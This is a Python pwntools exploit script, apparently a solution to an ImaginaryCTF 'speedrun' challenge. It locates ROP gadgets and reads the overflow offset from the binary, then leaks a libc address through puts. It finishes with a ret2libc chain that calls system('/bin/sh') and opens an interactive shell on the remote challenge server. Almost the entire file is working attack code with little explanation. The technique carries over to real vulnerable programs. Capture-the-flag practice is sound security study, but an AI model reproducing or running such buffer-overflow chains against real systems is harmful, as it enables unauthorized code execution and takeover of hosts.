#!/usr/bin/env python3

import os, sys
from pwn import *
from base64 import b64decode
from binascii import unhexlify,hexlify

def get_gadgets(binary):
    gadgets = []
    rop = ROP(binary)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    ret = rop.find_gadget(['ret']).address

    log.info("Got pop rdi; ret:  " +  hex(pop_rdi))
    log.info("Got ret:  " + hex(ret))
    gadgets.append(pop_rdi)
    gadgets.append(ret)

    return gadgets


def start(argv=[], *a, **kw):
    '''Locally start the exploit'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe.path] + argv, *a, **kw)


def get_addr(func_name, argv=[], *a, **kw):
    '''Leak address of provided function'''
    func_got = exe.got[func_name]
    log.info(func_name + " =  GOT @ " + hex(func_got))

    # rop chain to print addrs
    # pop rdi, ret;  no second ret, don't need to align stack
    # pops func_got address into rdi, then prints it with puts
    leak_rop = buffer + p64(POP_RDI) + p64(func_got) + p64(PUTS_PLT) + p64(MAIN_PLT)
    

    if args.LOCAL or args.GDB:
        
        # send payload to local process
        print(io.clean())
        io.sendline(leak_rop)
        
        # receive thanks line, parse leaked address
        thanks = io.recvline().strip()
        received = io.recvline().strip()
        log.info("RECEIVED:   " + str(received))
        leak = u64(received.ljust(8, b"\x00"))
        log.info("leaked libc address,  " + func_name + ": " + hex(leak))

    
    if args.REMOTE:
        # Send payload through connection to remote server
        print(conn.clean())
        conn.sendline(leak_rop)
        
        # receive thanks line, parse leaked address
        thanks = conn.recvline().strip()
        received = conn.recvline().strip()
        log.info("RECEIVED:   " + str(received))
        leak = u64(received.ljust(8, b"\x00"))
        log.info("leaked libc address,  " + func_name + ": " + hex(leak))

    # if not libc yet, stop here
    # if libc defined, save base address
    if libc != "":
        libc.address = leak - libc.symbols[func_name] 
        log.info("libc base @ %s" % hex(libc.address))

    return hex(leak)


if args.GDB:
    exe = context.binary = ELF('./speedrun')
    # ./exploit.py GDB
    gdbscript = '''
    break main
    continue
    '''.format(**locals())

    # get addresses
    PUTS_PLT = exe.plt['puts'] 
    MAIN_PLT = exe.symbols['main']
    POP_RDI, RET = get_gadgets('speedrun')

    log.info("main start: " + hex(MAIN_PLT))
    log.info("uts plt: " + hex(PUTS_PLT))

    # Start process
    io = start()

    # Get size of buffer
    # 0x40119 is the addr of 'sub rsp,0xYYYY' where Y is the buffer size
    offset = io.leak(0x401149, 4)
    offset = int(offset[::-1].hex(), 16) + 8
    log.info("Offset:  " + str(offset))

    # Set up buffer and set libc to local copy
    buffer = b'A'*offset
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
    
    # Libc base leaked with calls to get_addr()
    
    #get_addr("puts")
    # [*] leaked libc address,  puts: 0x7ffff7e415a0
    #get_addr("setvbuf")
    #[*] leaked libc address,  setvbuf: 0x7ffff7e41e60

    # [*] libc base @ 0x7ffff7dba000
    lib_base = 0x7ffff7dba000 
    log.info(hex(lib_base)) 

    # Get address of system() and /bin/sh string
    BINSH = next(libc.search(b'/bin/sh')) + lib_base
    SYSTEM = libc.sym["system"] + lib_base
    EXIT = libc.sym["exit"] + lib_base
    log.info("/bin/sh - %s " % hex(BINSH))
    log.info("system %s " % hex(SYSTEM))

    # Put together rop chain
    # pop rdi; ret; ret to put /bin/sh into rdi, then call system(), then exit()
    payload = buffer + p64(POP_RDI) + p64(BINSH) + p64(RET) + p64(SYSTEM) + p64(EXIT)

    # Send payload to local process in gdb
    io.sendline(payload)
    io.interactive()


if args.REMOTE:
    conn = remote("chal.imaginaryctf.org", 42020)
    conn.recvuntil("---------------------------BEGIN  DATA---------------------------")
    b64_binary = conn.recvuntil("----------------------------END  DATA----------------------------").decode().split('\n')[1]

    # decode and write to binary
    binary = b64decode(b64_binary)
    with open('tmp_binary', 'wb') as fp:
        fp.write(binary)
    os.system('chmod +x tmp_binary')
    
    exe = context.binary = ELF('./tmp_binary')

    # get addresses
    PUTS_PLT = exe.plt['puts'] 
    MAIN_PLT = exe.symbols['main']
    POP_RDI, RET = get_gadgets('tmp_binary')

    log.info("main start: " + hex(MAIN_PLT))
    log.info("puts plt: " + hex(PUTS_PLT))

    # Get offset from running process
    #io = start()
    #offset = io.leak(0x401149, 4)
    #offset = int(offset[::-1].hex(), 16) + 8
    #print("offset:  ", offset)

    ### Get offset from binary on disk
    offset = exe.disasm(0x401149, 4).split(':')[1].split('       ')[1].replace(' ', '')
    offset = unhexlify(offset)[::-1]
    offset = int(hexlify(offset), 16) + 8
    log.info("Got offset:  " + str(offset))
    
    # Leak libc addresses 

    # Got libc by leaking puts, gets, setvbuf
    libc = ELF("./libc6_2.28-10_amd64.so")
    
    # [*] leaked libc address,  puts: 0x7ff81ab20910
    # [*] leaked libc address,  gets: 0x7f083780c040
    # [*] leaked libc address,  setvbuf: 0x7ff758ae2f90
    get_addr("puts")

    BINSH = next(libc.search(b'/bin/sh'))
    SYSTEM = libc.sym["system"]
    EXIT = libc.sym["exit"]
    log.info("/bin/sh - %s " % hex(BINSH))
    log.info("system %s " % hex(SYSTEM))

    buffer = b'A'*offset
    
    # Put together payload
    payload = buffer + p64(POP_RDI) + p64(BINSH) + p64(RET) + p64(SYSTEM) + p64(EXIT)
    
    print(f"Sending payload with buffer size {offset}")
    print(conn.clean())
    conn.sendline(payload)
    
    thanks = conn.recvline().strip()
    print(thanks)
    conn.sendline('id')
    print(conn.recvline())
    conn.interactive()

    conn.close()

    




